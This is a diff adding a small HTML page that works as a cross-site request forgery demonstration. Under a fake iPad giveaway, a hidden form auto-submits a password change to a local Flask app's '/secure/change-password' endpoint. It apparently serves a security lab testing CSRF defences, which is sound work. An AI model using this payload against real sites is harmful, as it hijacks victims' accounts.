@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <h1>Win a Free iPad!</h1>
+    <form id="attackForm" action="http://127.0.0.1:5000/secure/change-password" method="POST">
+      <input type="hidden" name="new_password" value="HackedPassword123" />
+    </form>
+    <script>
+      // Automatically submit the form to Flask on port 5000
+      document.getElementById('attackForm').submit();
+    </script>
+  </body>
+</html>
